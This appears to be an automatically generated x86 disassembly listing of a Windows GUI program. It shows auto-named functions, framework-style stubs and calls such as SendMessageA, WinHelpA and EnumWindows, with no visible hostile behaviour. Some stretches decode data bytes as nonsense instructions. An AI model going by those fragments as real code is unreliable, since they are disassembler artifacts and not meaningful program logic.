mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_456054
push eax
call SendMessageA
pop ebx
retn
sub_445eee
jmp sub_403a2c
sub_445ef5
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445f8e
jmp sub_403a2c
sub_446107
jmp sub_403a2c
sub_44616c
push ebx
mov ebx eax
mov eax ebx
call sub_445c20
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_4533f0
pop ebx
retn
sub_44626c
push ebx
mov ebx eax
mov eax ebx
call sub_44f460
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_446364
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_4034ac
sub_446414
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_456054
push eax
call SendMessageA
pop ebx
retn
sub_446496
jmp sub_403a2c
sub_44649d
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446588
jmp sub_403a2c
sub_44658f
pop ebx
pop ecx
pop ebp
retn
sub_446683
jmp sub_403a2c
sub_44668a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446707
jmp sub_403a2c
sub_44670e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446864
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_44f830
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_4468b4
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_456054
push eax
call SendMessageA
pop ebx
retn
sub_4469e8
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_4535f4
sub_446a1c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_446a24
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_446a2c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_446a58
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_450a20
sub_446bb0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_446bd0
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_4535f4
sub_446e9b
jmp sub_403778
sub_446ea0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46f50c
call sub_403ae0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44712c
jmp sub_403a2c
sub_447133
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44713c
push ebx
mov ebx eax
mov eax ebx
call sub_44f460
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_447209
jmp sub_403a2c
sub_447210
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44721c
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_447298
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_4473b2
jmp sub_403a2c
sub_4473fc
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_447487
jmp sub_403a2c
sub_44748e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4474c0
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_4474cc
mov [ eax + 0x210 ] edx
retn
sub_44751d
jmp sub_403a2c
sub_447524
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4475ec
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_4535f4
sub_447640
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_447655
mov eax [ eax + 0x238 ]
retn
sub_447655
push 0x0
xor ecx ecx
mov edx 0x154
call sub_450a20
retn
sub_447994
jmp sub_403a2c
sub_44799b
pop ebx
mov esp ebp
pop ebp
retn
sub_447d58
jmp sub_403a2c
sub_447d5f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447f1d
jmp sub_403a2c
sub_447f24
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447f30
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_448114
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_448120
mov eax [ r-xdata ]
retn
sub_448351
jmp sub_403a2c
sub_448360
retn
sub_448416
jmp sub_403a2c
sub_4484c0
mov eax [ r-xdata ]
retn
sub_4484c8
xor eax eax
retn
sub_4484ec
retn
sub_448604
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_4535f4
sub_44867c
push ebx
mov ebx eax
mov eax ebx
call sub_466768
test eax eax
je r-xdata
mov eax ebx
call sub_450da8
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_4486a0
xor eax eax
retn
sub_448767
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5765173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_448780
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_4034ac
sub_448871
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_44887a
jmp sub_403a2c
j_sub_448871
jmp sub_448871
sub_448881
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4489b4
mov al [ eax + 0x211 ]
retn
sub_4489e8
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_4535f4
sub_448bc8
call sub_4535f4
retn
sub_448c45
jmp sub_403a2c
sub_448c4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44900f
jmp sub_403a2c
sub_449016
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_449020
mov ecx [ eax + 0x214 ]
push ecx
mov ecx [ eax + 0x210 ]
call sub_448ed8
retn
sub_44908c
mov ecx [ eax + 0x214 ]
push ecx
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_448ed8
retn
sub_4490a4
push edx
mov ecx [ eax + 0x210 ]
mov edx [ eax + 0x20c ]
call sub_448ed8
retn
sub_4490b8
push ebx
mov ebx eax
mov eax ebx
call sub_44f460
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_4490dc
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_449214
call sub_4490fc
retn
sub_44921c
call sub_4490fc
retn
sub_44924c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_449279
jmp sub_403a2c
sub_449280
pop ebp
retn
sub_449284
sub [ rw-data ] 0x1
retn
sub_449322
inc ebp
add al dl
retn 0x45
sub_4493e1
jmp sub_403a2c
sub_4493e8
pop ebp
retn
sub_4493ec
sub [ rw-data ] 0x1
retn
sub_4493f4
out 0x48 al
add bh bh
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_449c6c
sub_449405
add eax 0xffffffe0
jmp sub_4499ec
sub_44940d
add eax 0xffffffe0
jmp sub_449a54
sub_449415
add eax 0xffffffe0
jmp sub_449b68
sub_44941d
add eax 0xffffffe0
jmp sub_449bdc
sub_449425
add eax 0xffffffe0
jmp sub_449698
sub_44942d
add eax 0xffffffe0
jmp sub_4496ac
sub_449435
add eax 0xffffffe0
jmp sub_449724
sub_44944d
add eax 0xffffffe0
jmp sub_449854
sub_449455
add eax 0xffffffe0
jmp sub_44999c
sub_44945d
add eax 0xffffffe0
jmp sub_4499a0
sub_449465
add eax 0xffffffe0
jmp sub_4499bc
sub_449477
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a18
sub_449481
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a2c
sub_449655
jmp sub_403a2c
sub_44965c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_449698
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_404100
pop ebx
retn
sub_449713
jmp sub_403a2c
sub_44971a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4497ac
jmp sub_403a2c
sub_4497b3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_449847
jmp sub_403a2c
sub_44984e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44994c
jmp sub_403a2c
sub_449953
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44999c
mov [ eax + 0xc ] edx
retn
sub_4499a0
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_4499c5
inc [ ebx + 0x74001c7b ]
or [ ebp + 0x70e81c43 ] cl
mov edi 0x3d83fffb
adc bl ch
dec eax
add [ eax ] al
je r-xdata
pop ebx
retn
mov eax rw-data
call sub_405944
sub_449a44
jmp sub_403a2c
sub_449a4b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449b4a
jmp sub_403a2c
sub_449b51
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449bca
jmp sub_403a2c
sub_449bd1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_449c5c
jmp sub_403a2c
sub_449c63
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449d57
jmp sub_403a2c
sub_449d5e
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_449e20
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_449d6c
call EnumWindows
retn
sub_449eb2
jmp sub_403a2c
sub_449eb9
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_449ec4
xor eax eax
retn
sub_449fbd
jmp sub_403a2c
sub_449fc4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44a0ae
jmp sub_403a2c
sub_44a0b5
pop ebp
retn
sub_44a10a
jmp sub_403a2c
sub_44a111
pop ebp
retn
sub_44a362
inc esp
add [ esp + ecx * 8 - 0x318bffbc ] bh
inc esp
add [ eax + 0x240044cc ] al
iretd
sub_44a3ee
inc esp
add [ esp + ecx * 8 - 0x318bffbc ] bh
inc esp
add [ eax + 0x240044cc ] al
iretd
sub_44a472
inc esp
add ah cl
into
inc esp
add [ ecx + edx * 8 + 0x44 ] al
add [ eax - 0x43ffbb33 ] bh
int3
sub_44a482
inc esp
add ah bh
iretd
sub_44a536
inc esp
add ah cl
into
inc esp
add [ ecx + edx * 8 + 0x44 ] al
add [ eax - 0x43ffbb33 ] bh
int3
sub_44a546
inc esp
add ah bh
iretd
sub_44b2ac
jmp r-xdata
sub_44b2ae
0xe8ffe9ff 0xe7ff
sub_44b2b5
jmp esi
sub_44b40c
inc esp
add [ eax + eax ] ah
inc ebp
add [ esi + edi * 8 - 0x150bffbc ] dl
inc esp
add ah ch
0xfd380044 0x44
sub_44c02c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_44c14d
add eax 0xffffff8c
jmp sub_4586e0
sub_44c155
add eax 0xffffff8c
jmp sub_4586e4
sub_44c15d
add eax 0xffffff8c
jmp sub_4587d0
sub_44c165
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_44c172
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_44c17f
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_44c18c
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_44c199
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_44c1a6
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_44c1b3
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_44c1c0
add eax 0xffffff8c
jmp sub_459e40
sub_44c1d2
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405a18
sub_44c1dc
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405a2c
sub_44c634
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_44c947
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_4182d4
retn
sub_44c964
push 0x15
mov ecx rw-data
call sub_418294
retn
sub_44c9fc
call GetCapture
call sub_44c734
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_44ca89
0x44
sub_44cc60
push ebx
push eax
push sub_44cde4
call sub_4224bc
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_44cc78
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_44cca8
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_422570
pop ebx
retn
sub_44cd86
jmp sub_403778
sub_44cdb8
xor eax eax
retn
sub_44cdbc
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_44cdd4
retn
sub_44cdd8
mov eax [ rw-data ]
retn
sub_44cde0
retn
sub_44ce0e
jmp sub_403778
sub_44ce13
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46f50c
call sub_403ae0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ce30
call sub_4034f0
xor eax eax
mov [ rw-data ] eax
retn
sub_44ce40
call sub_4034ec
xor eax eax
mov [ rw-data ] eax
retn
sub_44ce50
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_44cf00
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_44cf18
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_44cf64
retn
sub_44d11c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_4034ac
pop esi
retn
sub_44d130
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_4034ac
pop esi
retn
sub_44d144
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_44d150
mov eax 0x4
retn
sub_44d158
retn
sub_44dd49
jmp sub_403778
sub_44e036
jmp sub_403a2c
sub_44e0a8
jmp sub_403a2c
sub_44e0b4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_44dddc
sub_44e233
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_425540
retn
sub_44e249
jmp sub_403a2c
sub_44e270
jmp sub_403a2c
sub_44e2f2
jmp sub_403a2c
sub_44e31a
jmp sub_403a2c
sub_44e321
mov esp ebp
pop ebp
retn
sub_44e3d9
jmp sub_403a2c
sub_44e430
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44e3fc
mov [ ebx + 0x58 ] esi
sub_44e584
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_44e598
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403460
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44e681
jmp sub_403a2c
sub_44e688
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e70b
jmp sub_403a2c
sub_44e712
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_44eae0
xor eax eax
retn
sub_44eae4
mov al [ eax + 0x58 ]
retn
sub_44eae8
xor eax eax
retn
sub_44eaec
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_44eaf4
mov eax [ eax + 0x30 ]
retn
sub_44eb98
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_44ec44
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_44ec5c
mov [ eax + 0x5d ] dl
retn
sub_44ec60
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_452858
sub_44ec70
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_44f153
jmp sub_403a2c
sub_44f15a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f1bc
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_44f240
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_44f35d
jmp sub_403a2c
sub_44f364
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f460
push eax
xor ecx ecx
mov edx 0xb037
call sub_450a20
retn
sub_44f621
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_4034ac
sub_44f6d2
jmp sub_403a2c
sub_44f6d9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f7b0
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_450a20
sub_44f7c8
push 0x0
xor ecx ecx
mov edx 0xe
call sub_450a20
retn
sub_44f7d8
push edx
mov edx 0xd
call sub_450a20
retn
sub_44f7e4
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_44f7f8
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_44f8d9
jmp sub_403a2c
sub_44f8e0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f8e8
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_450a20
sub_44f958
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_44f96c
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_44f978
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_44f980
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_450a20
sub_44f9a4
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_450a20
sub_44f9c8
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_450a20
sub_44fa10
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_44fa18
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_450a20
sub_44fa3c
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_450a20
sub_44fa60
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_450a20
sub_44fa7c
push ebx
mov ebx eax
call sub_44c9fc
cmp ebx eax
sete al
pop ebx
retn
sub_44fab4
push esi
mov dl 0x1
mov si 0xffce
call sub_4034ac
pop esi
retn
sub_44fbfe
jmp sub_403a2c
sub_44fc05
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44fd28
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_44fc9c
retn
sub_44fd7c
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_44fd90
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_44fe75
jmp sub_403a2c
sub_44fe94
xor eax eax
retn
sub_44fe98
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44feb0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44fec8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_44fee0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_44fefc
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_44ff14
retn
sub_44ffd8
retn
sub_44ffdc
cmp eax [ rw-data ]
sete al
retn
sub_450050
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_45016c
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_4034ac
pop esi
pop ebp
retn 0x4
sub_4501ac
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_450443
jmp sub_403a2c
sub_45044a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450454
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_4034ac
pop esi
retn
sub_450468
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_4034ac
pop esi
retn
sub_450737
jmp sub_403a2c
sub_4507e0
push esi
mov si 0xffee
call sub_4034ac
pop esi
retn
sub_4507ec
mov al 0x1
retn
sub_450ac4
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_44eea8
retn
sub_450ae8
retn
sub_450d01
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c548
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_450d1c
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41ea00
retn
sub_450e14
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_45142c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_451434
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_45143c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_4514f4
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_451514
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_44f9a4
mov [ ebx + 0x9a ] 0x1
sub_45156c
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_44f948
mov [ ebx + 0x56 ] 0x1
sub_451590
mov [ edx + 0xc ] 0x1
retn
sub_451598
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_450a20
sub_4515b0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_450a20
sub_4515c8
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_45182e
jmp sub_403a2c
sub_451835
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_451860
mov eax [ r-xdata ]
retn
sub_4519fc
jmp sub_403a2c
sub_451a03
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451b24
mov eax [ eax + 0xb8 ]
retn
sub_451b8c
push ebx
mov ebx eax
mov eax ebx
call sub_44feb0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_451ba8
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_451d40
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_451d70
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_451d78
call sub_44e914
retn
sub_451e78
jmp sub_403a2c
sub_452038
jmp sub_403a2c
sub_452088
jmp sub_403a2c
sub_4520c0
retn
sub_452349
jmp sub_403a2c
sub_4524d1
jmp sub_403a2c
sub_452833
jmp sub_403a2c
sub_4528df
jmp sub_403a2c
sub_4528ec
inc [ eax + 0x160 ]
retn
sub_4528f4
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_452914
sub_452914
xor edx edx
call sub_452858
retn
sub_4529e1
jmp sub_403a2c
sub_4529e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452ad7
jmp sub_403a2c
sub_452ffe
jmp sub_403a2c
sub_453005
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4531cd
jmp sub_403a2c
sub_4531d4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4532a8
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_453495
